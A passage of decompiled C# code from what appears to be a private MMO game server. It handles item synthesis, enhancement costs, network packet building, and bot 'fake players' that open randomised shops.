							base.FLD_人物_追加_防御 += 100;
							base.人物追加最大_HP += 800;
							base.人物追加最大_MP += 800;
							base.FLD_人物_武功攻击力增加百分比 += 0.1;
							base.FLD_人物_追加_回避 += (int)((double)base.FLD_回避 * 0.05);
							base.FLD_人物_追加_经验百分比 += 0.4;
							break;
						}
						return;
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "Set个人药品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 合成系统解锁()
		{
			for (int i = 0; i < 96; i++)
			{
				装备栏包裹[i].锁定 = false;
			}
		}

		public void 合成系统加锁()
		{
			for (int i = 0; i < 96; i++)
			{
				装备栏包裹[i].锁定 = true;
			}
		}

		public void 元宝合成(byte[] 封包数据, int 封包大小)
		{
			CheckTreasureGems();
			byte[] dst = new byte[4];
			Buffer.BlockCopy(封包数据, 10, dst, 0, 4);
			byte[] array = Converter.hexStringToByte("AA551E002A0121171000010000009400000000000000190000000000000000005C9355AA");
			if (base.FLD_RXPIONT >= World.元宝合成)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 10, 4);
				元宝合成开关 = 1;
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 10, 4);
				元宝合成开关 = 0;
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.FLD_RXPIONT), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(5), 0, array, 22, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 元宝合成2(byte[] 封包数据, int 封包大小)
		{
			if (!(DateTime.Now.Subtract(使用百宝time).TotalSeconds < 2.0))
			{
				使用百宝time = DateTime.Now;
				CheckTreasureGems();
				byte[] dst = new byte[4];
				Buffer.BlockCopy(封包数据, 10, dst, 0, 4);
				byte[] array = Converter.hexStringToByte("AA551E002A0123171000010000009400000000000000190000000000000000005C9355AA");
				if (base.FLD_RXPIONT >= World.元宝合成)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 10, 4);
					检察元宝数据(World.元宝合成, 0, "合成");
					元宝合成开关 = 1;
					RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "元宝合成", 1, World.元宝合成);
					SaveGemData();
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 10, 4);
					元宝合成开关 = 0;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.FLD_RXPIONT), 0, array, 14, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 18, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(5), 0, array, 22, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
		}

		public void 发送快报(string 人物名, int 强化阶段, byte[] PID, int 人物势力)
		{
			byte[] array = Converter.hexStringToByte("AA555E002C01005050000100000002000000000000000A000000C900000042EEF80500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000008AF855AA");
			byte[] bytes = Encoding.Default.GetBytes(人物名);
			Buffer.BlockCopy(bytes, 0, array, 38, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(强化阶段), 0, array, 22, 1);
			Buffer.BlockCopy(PID, 0, array, 30, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(人物势力), 0, array, 88, 1);
			foreach (Players value in World.AllConnectedPlayers.Values)
			{
				if (value.Client != null && !value.Client.挂机)
				{
					value.Client.Send多包(array, array.Length);
				}
			}
		}

		public int 计算合成强化费用(ItmeClass Itme, int 位置, int 操作ID)
		{
			int num = ((Itme.FLD_LEVEL <= 60) ? ((int)((double)Itme.FLD_LEVEL * 0.1 * 2000.0)) : ((Itme.FLD_LEVEL > 60 && Itme.FLD_LEVEL <= 70) ? 50000 : ((Itme.FLD_LEVEL > 70 && Itme.FLD_LEVEL <= 80) ? 60000 : ((Itme.FLD_LEVEL > 80 && Itme.FLD_LEVEL <= 90) ? 80000 : ((Itme.FLD_LEVEL > 90 && Itme.FLD_LEVEL <= 100) ? 100000 : ((Itme.FLD_LEVEL > 100 && Itme.FLD_LEVEL <= 110) ? 150000 : ((Itme.FLD_LEVEL > 110 && Itme.FLD_LEVEL <= 120) ? 200000 : ((Itme.FLD_LEVEL > 120 && Itme.FLD_LEVEL <= 130) ? 250000 : ((Itme.FLD_LEVEL > 130 && Itme.FLD_LEVEL <= 140) ? 300000 : ((Itme.FLD_LEVEL <= 140 || Itme.FLD_LEVEL > 150) ? ((int)((double)Itme.FLD_LEVEL * 0.1 * 50000.0)) : 350000))))))))));
			switch (操作ID)
			{
			case 11:
				if (装备栏包裹[位置].FLD_强化数量 != 0)
				{
					num *= 装备栏包裹[位置].FLD_强化数量 + 1;
				}
				break;
			case 21:
				if (装备栏包裹[位置].FLD_强化数量 != 0)
				{
					num *= 装备栏包裹[位置].FLD_强化数量 + 1;
				}
				break;
			case 61:
				if (装备栏包裹[位置].FLD_强化数量 != 0)
				{
					num *= 装备栏包裹[位置].FLD_强化数量 + 1;
				}
				break;
			}
			return num;
		}

		public int 获取随机数1(int 数1, int 数2)
		{
			Random random = new Random(BitConverter.ToInt32(Guid.NewGuid().ToByteArray(), 0));
			return random.Next(数1, 数2);
		}

		public int 获取随机数2(int 数1, int 数2)
		{
			byte[] value = Guid.NewGuid().ToByteArray();
			int seed = BitConverter.ToInt32(value, 0);
			Random random = new Random(seed);
			Random random2 = new Random();
			return random.Next(数1, 数2);
		}

		public int 获取随机卖物品(Players 假人)
		{
			int maxValue = 300;
			try
			{
				if (World.假人当前卖物品阶段 == 1)
				{
					maxValue = 300;
				}
				if (World.假人当前卖物品阶段 == 2)
				{
					maxValue = 600;
				}
				if (World.假人当前卖物品阶段 == 3)
				{
					maxValue = 900;
				}
				if (World.假人当前卖物品阶段 == 4)
				{
					maxValue = 1200;
				}
				int result = 2;
				for (int i = 0; i < 1000; i++)
				{
					byte[] value = Guid.NewGuid().ToByteArray();
					int seed = BitConverter.ToInt32(value, 0);
					Random random = new Random(seed);
					Random random2 = new Random();
					int num = random.Next(0, maxValue);
					if (World.假人出售物品[num].Length >= 1)
					{
						result = num;
						break;
					}
				}
				return result;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "获取随机卖物品 出错![" + 假人.Userid + "]-[" + 假人.UserName + "]" + ex.Message);
				return 2;
			}
		}

		public string 假人获取随机物品属性(string 物品)
		{
			try
			{
				string[] array = 物品.Trim().Split(';');
				int num = int.Parse(array[1]);
				int num16 = int.Parse(array[2]);
				int num27 = int.Parse(array[3]);
				int num38 = int.Parse(array[4]);
				int num49 = int.Parse(array[5]);
				int num60 = int.Parse(array[6]);
				int num71 = int.Parse(array[7]);
				int num82 = int.Parse(array[8]);
				if (num == 800000001 || num == 800000002 || num == 800000023 || num == 800000024)
				{
					switch (num38)
					{
					case 700025:
					{
						int num35 = 0;
						num35 = 获取随机数1(700020, 700026);
						int num36 = num35 - num38;
						num36 *= 获取随机数2(2, 10);
						num16 += num36;
						num38 = num35;
						break;
					}
					case 700030:
					{
						int num33 = 0;
						num33 = 获取随机数1(700025, 700031);
						int num34 = num33 - num38;
						num34 *= 获取随机数2(2, 10);
						num16 += num34;
						num38 = num33;
						break;
					}
					case 100015:
					{
						int num31 = 0;
						num31 = 获取随机数1(100010, 100016);
						int num32 = num31 - num38;
						num32 *= 获取随机数2(2, 10);
						num16 += num32;
						num38 = num31;
						break;
					}
					case 100025:
					{
						int num29 = 0;
						num29 = 获取随机数1(100015, 100026);
						int num30 = num29 - num38;
						num30 *= 获取随机数2(2, 10);
						num16 += num30;
						num38 = num29;
						break;
					}
					case 200008:
					{
						int num26 = 0;
						num26 = 获取随机数1(200003, 200009);
						int num28 = num26 - num38;
						num28 *= 获取随机数2(2, 10);
						num16 += num28;
						num38 = num26;
						break;
					}
					case 200010:
					{
						int num24 = 0;
						num24 = 获取随机数1(100008, 100011);
						int num25 = num24 - num38;
						num25 *= 获取随机数2(2, 10);
						num16 += num25;
						num38 = num24;
						break;
					}
					case 1100040:
					{
						int num22 = 0;
						num22 = 获取随机数1(1100035, 1100041);
						int num23 = num22 - num38;
						num23 *= 获取随机数2(2, 10);
						num16 += num23;
						num38 = num22;
						break;
					}
					case 1100080:
					{
						int num20 = 0;
						num20 = 获取随机数1(1100070, 1100081);
						int num21 = num20 - num38;
						num21 *= 获取随机数2(2, 10);
						num16 += num21;
						num38 = num20;
						break;
					}
					case 300030:
					{
						int num18 = 0;
						num18 = 获取随机数1(300020, 300031);
						int num19 = num18 - num38;
						num19 *= 获取随机数2(2, 10);
						num16 += num19;
						num38 = num18;
						break;
					}
					case 300050:
					{
						int num15 = 0;
						num15 = 获取随机数1(300035, 300051);
						int num17 = num15 - num38;
						num17 *= 获取随机数2(2, 10);
						num16 += num17;
						num38 = num15;
						break;
					}
					case 400010:
					{
						int num13 = 0;
						num13 = 获取随机数1(400006, 400011);
						int num14 = num13 - num38;
						num14 *= 获取随机数2(2, 10);
						num16 += num14;
						num38 = num13;
						break;
					}
					case 1000020:
					{
						int num11 = 0;
						num11 = 获取随机数1(1000012, 1000021);
						int num12 = num11 - num38;
						num12 *= 获取随机数2(2, 10);
						num16 += num12;
						num38 = num11;
						break;
					}
					case 1000025:
					{
						int num9 = 0;
						num9 = 获取随机数1(1000017, 1000026);
						int num10 = num9 - num38;
						num10 *= 获取随机数2(2, 10);
						num16 += num10;
						num38 = num9;
						break;
					}
					case 500010:
					{
						int num7 = 0;
						num7 = 获取随机数1(500005, 500011);
						int num8 = num7 - num38;
						num8 *= 获取随机数2(2, 10);
						num16 += num8;
						num38 = num7;
						break;
					}
					case 600010:
					{
						int num93 = 0;
						num93 = 获取随机数1(600005, 600011);
						int num2 = num93 - num38;
						num2 *= 获取随机数2(2, 10);
						num16 += num2;
						num38 = num93;
						break;
					}
					}
				}
				if (num49 == 100000015)
				{
					int num37 = 0;
					num37 = 获取随机数1(100000013, 100000016);
					int num39 = num37 - num49;
					num39 *= 获取随机数2(2, 10);
					num16 += num39;
					num49 = num37;
				}
				if (num60 == 100000015)
				{
					int num40 = 0;
					num40 = 获取随机数1(100000013, 100000016);
					int num41 = num40 - num60;
					num41 *= 获取随机数2(2, 10);
					num16 += num41;
					num60 = num40;
				}
				if (num71 == 100000015)
				{
					int num42 = 0;
					num42 = 获取随机数1(100000013, 100000016);
					int num43 = num42 - num71;
					num43 *= 获取随机数2(2, 10);
					num16 += num43;
					num71 = num42;
				}
				if (num82 == 100000015)
				{
					int num44 = 0;
					num44 = 获取随机数1(100000013, 100000016);
					int num45 = num44 - num82;
					num45 *= 获取随机数2(2, 10);
					num16 += num45;
					num82 = num44;
				}
				if (num49 == 100000025)
				{
					int num46 = 0;
					num46 = 获取随机数1(100000020, 100000026);
					int num47 = num46 - num49;
					num47 *= 获取随机数2(2, 10);
					num16 += num47;
					num49 = num46;
				}
				if (num60 == 100000025)
				{
					int num48 = 0;
					num48 = 获取随机数1(100000020, 100000026);
					int num50 = num48 - num60;
					num50 *= 获取随机数2(2, 10);
					num16 += num50;
					num60 = num48;
				}
				if (num71 == 100000025)
				{
					int num51 = 0;
					num51 = 获取随机数1(100000020, 100000026);
					int num52 = num51 - num71;
					num52 *= 获取随机数2(2, 10);
					num16 += num52;
					num71 = num51;
				}
				if (num82 == 100000025)
				{
					int num53 = 0;
					num53 = 获取随机数1(100000020, 100000026);
					int num54 = num53 - num82;
					num54 *= 获取随机数2(2, 10);
					num16 += num54;
					num82 = num53;
				}
				if (num49 == 10000015)
				{
					int num55 = 0;
					num55 = 获取随机数1(10000013, 10000016);
					int num56 = num55 - num49;
					num56 *= 获取随机数2(2, 10);
					num16 += num56;
					num49 = num55;
				}
				if (num60 == 10000015)
				{
					int num57 = 0;
					num57 = 获取随机数1(10000013, 10000016);
					int num58 = num57 - num60;
					num58 *= 获取随机数2(2, 10);
					num16 += num58;
					num60 = num57;
				}
				if (num71 == 10000015)
				{
					int num59 = 0;
					num59 = 获取随机数1(10000013, 10000016);
					int num61 = num59 - num71;
					num61 *= 获取随机数2(2, 10);
					num16 += num61;
					num71 = num59;
				}
				if (num82 == 10000015)
				{
					int num62 = 0;
					num62 = 获取随机数1(10000013, 10000016);
					int num63 = num62 - num82;
					num63 *= 获取随机数2(2, 10);
					num16 += num63;
					num82 = num62;
				}
				if (num49 == 10000025)
				{
					int num64 = 0;
					num64 = 获取随机数1(10000018, 10000026);
					int num65 = num64 - num49;
					num65 *= 获取随机数2(2, 10);
					num16 += num65;
					num49 = num64;
				}
				if (num60 == 10000025)
				{
					int num66 = 0;
					num66 = 获取随机数1(10000018, 10000026);
					int num67 = num66 - num60;
					num67 *= 获取随机数2(2, 10);
					num16 += num67;
					num60 = num66;
				}
				if (num71 == 10000025)
				{
					int num68 = 0;
					num68 = 获取随机数1(10000018, 10000026);
					int num69 = num68 - num71;
					num69 *= 获取随机数2(2, 10);
					num16 += num69;
					num71 = num68;
				}
				if (num82 == 10000025)
				{
					int num70 = 0;
					num70 = 获取随机数1(10000018, 10000026);
					int num72 = num70 - num82;
					num72 *= 获取随机数2(2, 10);
					num16 += num72;
					num82 = num70;
				}
				if (num49 == 20000008)
				{
					int num73 = 0;
					num73 = 获取随机数1(20000006, 20000009);
					int num74 = num73 - num49;
					num74 *= 获取随机数2(2, 10);
					num16 += num74;
					num49 = num73;
				}
				if (num60 == 20000008)
				{
					int num75 = 0;
					num75 = 获取随机数1(20000006, 20000009);
					int num76 = num75 - num60;
					num76 *= 获取随机数2(2, 10);
					num16 += num76;
					num60 = num75;
				}
				if (num71 == 20000008)
				{
					int num77 = 0;
					num77 = 获取随机数1(20000006, 20000009);
					int num78 = num77 - num71;
					num78 *= 获取随机数2(2, 10);
					num16 += num78;
					num71 = num77;
				}
				if (num82 == 20000008)
				{
					int num79 = 0;
					num79 = 获取随机数1(20000006, 20000009);
					int num80 = num79 - num82;
					num80 *= 获取随机数2(2, 10);
					num16 += num80;
					num82 = num79;
				}
				if (num49 == 20000010)
				{
					int num81 = 0;
					num81 = 获取随机数1(20000008, 20000011);
					int num83 = num81 - num49;
					num83 *= 获取随机数2(2, 10);
					num16 += num83;
					num49 = num81;
				}
				if (num60 == 20000010)
				{
					int num84 = 0;
					num84 = 获取随机数1(20000008, 20000011);
					int num85 = num84 - num60;
					num85 *= 获取随机数2(2, 10);
					num16 += num85;
					num60 = num84;
				}
				if (num71 == 20000010)
				{
					int num86 = 0;
					num86 = 获取随机数1(20000008, 20000011);
					int num87 = num86 - num71;
					num87 *= 获取随机数2(2, 10);
					num16 += num87;
					num71 = num86;
				}
				if (num82 == 20000010)
				{
					int num88 = 0;
					num88 = 获取随机数1(20000008, 20000011);
					int num89 = num88 - num82;
					num89 *= 获取随机数2(2, 10);
					num16 += num89;
					num82 = num88;
				}
				if (num49 == 110000040)
				{
					int num90 = 0;
					num90 = 获取随机数1(110000035, 110000041);
					int num91 = num90 - num49;
					num91 *= 获取随机数2(2, 10);
					num16 += num91;
					num49 = num90;
				}
				if (num60 == 110000040)
				{
					int num92 = 0;
					num92 = 获取随机数1(110000035, 110000041);
					int num94 = num92 - num60;
					num94 *= 获取随机数2(2, 10);
					num16 += num94;
					num60 = num92;
				}
				if (num71 == 110000040)
				{
					int num95 = 0;
					num95 = 获取随机数1(110000035, 110000041);
					int num96 = num95 - num71;
					num96 *= 获取随机数2(2, 10);
					num16 += num96;
					num71 = num95;
				}
				if (num82 == 110000040)
				{
					int num97 = 0;
					num97 = 获取随机数1(110000035, 110000041);
					int num98 = num97 - num82;
					num98 *= 获取随机数2(2, 10);
					num16 += num98;
					num82 = num97;
				}
				if (num49 == 110000080)
				{
					int num99 = 0;
					num99 = 获取随机数1(110000072, 110000081);
					int num100 = num99 - num49;
					num100 *= 获取随机数2(2, 10);
					num16 += num100;
					num49 = num99;
				}
				if (num60 == 110000080)
				{
					int num101 = 0;
					num101 = 获取随机数1(110000072, 110000081);
					int num102 = num101 - num60;
					num102 *= 获取随机数2(2, 10);
					num16 += num102;
					num60 = num101;
				}
				if (num71 == 110000080)
				{
					int num103 = 0;
					num103 = 获取随机数1(110000072, 110000081);
					int num3 = num103 - num71;
					num3 *= 获取随机数2(2, 10);
					num16 += num3;
					num71 = num103;
				}
				if (num82 == 110000080)
				{
					int num4 = 0;
					num4 = 获取随机数1(110000072, 110000081);
					int num5 = num4 - num82;
					num5 *= 获取随机数2(2, 10);
					num16 += num5;
					num82 = num4;
				}
				if (num27 >= 2)
				{
					num27 = 获取随机数1(1, 13);
					int num6 = 获取随机数1(2, 20);
					num6 -= 10;
					num16 += num6;
				}
				if (num16 < 1)
				{
					num16 = 获取随机数1(2, 10);
				}
				return array[0] + ";" + num + ";" + num16 + ";" + num27 + ";" + num38 + ";" + num49 + ";" + num60 + ";" + num71 + ";" + num82 + ";0";
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "假人获取随机物品属性 出错" + ex.Message);
				return "";
			}
		}

		public void 假人更新商店(int 数量)
		{
			try
			{
				int num = 0;
				int num2 = World.假人开商店 + 数量;
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					if (value.假人是否开商店 == 0 && value.离线挂机打怪模式 == 1 && value.是否假人 != 0)
					{
						value.假人是否开商店 = 1;
						value.离线挂机打怪模式 = 0;
						value.Client.挂机 = true;
						value.Client.假人 = false;
						World.OfflineCount++;
						World.假人数量--;
						World.假人开商店++;
						if (World.假人数量 < 0)
						{
							World.假人数量 = 0;
						}
						value.假人开店(value, this);
					}
					num++;
					if (num >= num2)
					{
						break;
					}
				}
				系统提示("增加[" + 数量 + "]个店铺, 当前总店铺数量[" + World.OfflineCount + "]店铺...", 10, "假人店铺");
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "假人更新商店 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 关闭假人更新商店(int 数量)
		{
			try
			{
				int num = 0;
				int num2 = World.假人关商店 + 数量;
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					if (value.假人是否开商店 == 1 && value.离线挂机打怪模式 == 0 && value.是否假人 != 0)
					{
						value.假人是否开商店 = 0;
						value.离线挂机打怪模式 = 1;
						value.Client.挂机 = false;
						value.Client.假人 = true;
						World.OfflineCount--;
						World.假人数量++;
						World.假人关商店++;
						if (World.OfflineCount < 0)
						{
							World.OfflineCount = 0;
						}
						value.关店();
						value.移动(value.自动挂机坐标X, value.自动挂机坐标Y, 15f, value.自动挂机地图);
						value.获取复查范围Npc();
					}
					num++;
					if (num >= num2)
					{
						break;
					}
				}
				系统提示("减少[" + 数量 + "]个店铺, 当前总店铺数量[" + World.OfflineCount + "]店铺...", 10, "假人店铺");
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "假人更新商店 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 假人开店(Players 假人, Players 自己)
		{
			try
			{
				for (int i = 0; i < 12; i++)
				{
					if (假人.装备栏包裹[i].Get物品ID != 1000000415 && 假人.装备栏包裹[i].Get物品ID != 1700101)
					{
						假人.装备栏包裹[i].物品_byte = new byte[77];
					}
				}
				假人.初始化装备篮包裹();
				int num = 获取随机数1(1, 8);
				int[] array = new int[7];
				string[] array7 = new string[7];
				int[] array8 = new int[7];
				int[] array9 = new int[7];
				int[] array10 = new int[7];
				int[] array11 = new int[7];
				int[] array12 = new int[7];
				int[] array13 = new int[7];
				int[] array14 = new int[7];
				for (int j = 0; j < 7; j++)
				{
					array7[j] = "";
					array[j] = 0;
					array13[j] = 0;
					array14[j] = 0;
					array8[j] = 0;
					array9[j] = 0;
					array10[j] = 0;
					array11[j] = 0;
					array12[j] = 0;
				}
				for (int k = 0; k < num; k++)
				{
					int num9 = 假人.获取随机卖物品(假人);
					string text = "";
					text = World.假人出售物品[num9];
					if (text != "")
					{
						text = 假人获取随机物品属性(text);
						string[] array2 = text.Trim().Split(';');
						if (array2.Length >= 8)
						{
							array7[k] = array2[0];
							array[k] = int.Parse(array2[1]);
							array14[k] = int.Parse(array2[2]);
							array13[k] = int.Parse(array2[3]);
							array8[k] = int.Parse(array2[4]);
							array9[k] = int.Parse(array2[5]);
							array10[k] = int.Parse(array2[6]);
							array11[k] = int.Parse(array2[7]);
							array12[k] = int.Parse(array2[8]);
						}
					}
				}
				int num10 = 0;
				int num11 = 0;
				int num12 = 0;
				int num13 = 0;
				int num14 = 0;
				int num15 = 0;
				int num16 = 0;
				int num2 = 0;
				int num3 = 0;
				int num4 = 0;
				int num5 = 0;
				int num6 = 0;
				num10 = 假人.获取随机数1(100, 750);
				num11 = 假人.获取随机数2(1641, 2030);
				num12 = 假人.获取随机数1(260, 580);
				num13 = 假人.获取随机数2(2100, 2200);
				num14 = 假人.获取随机数1(140, 570);
				num15 = 假人.获取随机数2(1430, 1842);
				num16 = 假人.获取随机数1(100, 750);
				num2 = 假人.获取随机数2(1641, 2030);
				num3 = 假人.获取随机数1(260, 580);
				num4 = 假人.获取随机数2(2100, 2200);
				num5 = 假人.获取随机数1(140, 570);
				num6 = 假人.获取随机数2(1430, 1842);
				int num7 = 1;
				num7 = 假人.获取随机数1(1, 7);
				if (num7 >= 7)
				{
					假人.获取随机数1(1, 6);
				}
				if (num7 == 1)
				{
					假人.移动(num10, num11, 15f, 101);
				}
				if (num7 == 2)
				{
					假人.移动(num12, num13, 15f, 101);
				}
				if (num7 == 3)
				{
					假人.移动(num14, num15, 15f, 101);
				}
				if (num7 == 4)
				{
					假人.移动(num16, num2, 15f, 101);
				}
				if (num7 == 5)
				{
					假人.移动(num3, num4, 15f, 101);
				}
				if (num7 == 6)
				{
					假人.移动(num5, num6, 15f, 101);
				}
				string text2 = "临时名字";
				text2 = World.假人自动商店起名头[假人.获取随机数2(0, World.假人自动商店起名头.Length)];
				text2 += array7[假人.获取随机数1(0, num)];
				假人.打开仓库中 = true;
				假人.个人商店 = new 个人商店类
				{
					商店类型 = 1,
					商店名 = Encoding.Default.GetBytes(text2)
				};
				int num8 = 0;
				for (int l = 0; l < 7; l++)
				{
					if (array7[l] != "")
					{
						假人.假人增加物品带属性(假人, array[l], l, array13[l], array8[l], array9[l], array10[l], array11[l], array12[l], 0, 0, 0, 0, 0);
						假人.装备栏包裹[l].锁定 = true;
						个人商店物品类 value = new 个人商店物品类
						{
							数量 = array13[l],
							价格 = array14[l],
							位置 = num8,
							物品 = 假人.装备栏包裹[l]
						};
						假人.个人商店.商店物品列表.Add(BitConverter.ToInt64(假人.装备栏包裹[l].物品全局ID, 0), value);
						num8++;
					}
				}
				假人.个人商店.个人商店是否开启 = true;
				string hex = "AA551100000000CD0002000303000000000000000055AA";
				byte[] array3 = Converter.hexStringToByte(hex);
				Buffer.BlockCopy(BitConverter.GetBytes(假人.人物全服ID), 0, array3, 4, 2);
				if (假人.Client != null)
				{
					假人.Client.Send(array3, array3.Length);
				}
				string hex2 = "AA552300000000CA0014000100000000000000000000000600";
				string hex3 = "000000000000000055AA";
				byte[] array4 = Converter.hexStringToByte(hex2);
				byte[] array5 = Converter.hexStringToByte(hex3);
				byte[] array6 = new byte[array4.Length + array5.Length + 假人.个人商店.商店名.Length];
				Buffer.BlockCopy(array4, 0, array6, 0, array4.Length);
				Buffer.BlockCopy(假人.个人商店.商店名, 0, array6, 24, 假人.个人商店.商店名.Length);
				Buffer.BlockCopy(array5, 0, array6, array6.Length - array5.Length, array5.Length);
				array6[2] = (byte)(28 + 假人.个人商店.商店名.Length);
				array6[9] = (byte)(14 + 假人.个人商店.商店名.Length);
				array6[22] = (byte)假人.个人商店.商店名.Length;
				Buffer.BlockCopy(BitConverter.GetBytes(假人.人物全服ID), 0, array6, 14, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(假人.人物全服ID), 0, array6, 18, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(假人.人物全服ID), 0, array6, 4, 2);
				假人.个人商店.个人商店是否开启 = true;
				if (假人.Client != null)
				{
					假人.Client.Send(array6, array6.Length);
				}
				假人.发送当前范围广播数据(array6, array6.Length);
			}
			catch
			{
				if (假人.假人是否开商店 == 1 && 假人.离线挂机打怪模式 == 0)
				{
					假人.假人是否开商店 = 0;
					假人.离线挂机打怪模式 = 1;
					假人.Client.挂机 = false;
					假人.Client.假人 = true;
					World.OfflineCount--;
					World.假人数量++;
					if (World.OfflineCount < 0)
					{
						World.OfflineCount = 0;
					}
					假人.关店();
					假人.移动(假人.自动挂机坐标X, 假人.自动挂机坐标Y, 15f, 假人.自动挂机地图);
					假人.获取复查范围Npc();
				}
			}
		}

		public void 合成提示(int 操作ID, int 提示ID, int 钱数, 物品类 物品)
		{
			byte[] array = Converter.hexStringToByte("AA557A002302510075003F010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(提示ID), 0, array, 12, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 14, 2);
			if (物品 != null)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(物品.物品位置), 0, array, 26, 4);
				Buffer.BlockCopy(物品.物品ID, 0, array, 30, 4);
				Buffer.BlockCopy(物品.物品属性, 0, array, 38, World.物品属性大小);
			}
			Buffer.BlockCopy(BitConverter.GetBytes((long)钱数), 0, array, 98, 8);
			if (元宝合成开关 == 1)
			{
				Buffer.BlockCopy(BitConverter.GetBytes((long)World.元宝合成), 0, array, 103, 8);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(0L), 0, array, 103, 8);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public int 幸运符加成(int ID)
		{
			switch (ID)
			{
			case 800000003:
				return 5;
			case 800000004:
				return 10;
			case 800000005:
				return 15;
			default:
				return 0;
			case 1008001829:
				return 30;
			case 1008000136:
				return 25;
			case 800000029:
			case 1008000071:
				return 20;
			}
		}

		public int 真龙宝器(int ID)
		{
			if (1 == 0)
			{
			}
			int result = ID switch
			{
				1008001137 => 1100, 
				1008001138 => 1100, 
				_ => 0, 
			};
			if (1 == 0)
			{
			}
			return result;
		}

		public int 灵宠披风取玉(int ID)
		{
			if (1 == 0)
			{
			}
			int result = ID switch
			{
				1000001168 => 10, 
				1008001988 => 10, 
				_ => 0, 
			};
			if (1 == 0)
			{
			}
			return result;
		}

		public int 高级首饰材料(int ID)
		{
			if (1 == 0)
			{
			}
			int result = ID switch
			{
				1008000452 => 10, 
				1008000453 => 10, 
				1008000454 => 10, 
				_ => 0, 
			};
			if (1 == 0)
			{
			}
			return result;
		}

		public void 合成系统(byte[] 封包数据, int 封包大小)
		{
			Converter.ToString(封包数据);
			int num = BitConverter.ToUInt16(封包数据, 10);
			int num30 = 封包数据[26];
			int num41 = BitConverter.ToInt32(封包数据, 30);
			int num52 = 封包数据[14];
			int num63 = BitConverter.ToInt32(封包数据, 18);
			if (num30 >= 96 || num52 >= 96 || (!打开仓库中 && num < 10))
			{
				return;
			}
			try
			{
				封包修改(封包数据, 封包大小);
				打开仓库中 = true;
				byte[] array = Converter.hexStringToByte("AA557A000302510075003F010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(0L), 0, array, 98, 8);
				if (封包大小 <= 29)
				{
					return;
				}
				byte[] array12 = new byte[4];
				Buffer.BlockCopy(封包数据, 10, array12, 0, 4);
				switch (num)
				{
				case 410:
					try
					{
						if (合成物品表.TryGetValue(1, out var value176))
						{
							装备栏包裹[value176.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value176.位置]);
							合成物品表.Clear();
							合成系统解锁();
						}
						元宝合成开关 = 0;
						合成提示(num, 0, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex109)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex109.Message);
					}
					return;
				case 411:
					try
					{
						if (合成物品表.ContainsKey(1))
						{
							return;
						}
						ItmeClass value52;
						if (装备栏包裹[num30].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
						}
						else if (World.Itme.TryGetValue((int)装备栏包裹[num30].Get物品ID, out value52))
						{
							if (value52.FLD_PID == 1000001405 || value52.FLD_PID == 1000001406 || value52.FLD_PID == 1000001407 || value52.FLD_PID == 1000001408 || value52.FLD_PID == 1000001409)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								return;
							}
							if (value52.FLD_RESIDE2 != 32 && value52.FLD_RESIDE2 != 33 && value52.FLD_RESIDE2 != 34 && value52.FLD_RESIDE2 != 35 && value52.FLD_RESIDE2 != 36)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								return;
							}
							HcItimesClass hcItimesClass2 = new HcItimesClass();
							hcItimesClass2.位置 = num30;
							hcItimesClass2.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value53 = hcItimesClass2;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value53);
							合成提示(num, 0, 10000000, 装备栏包裹[num30]);
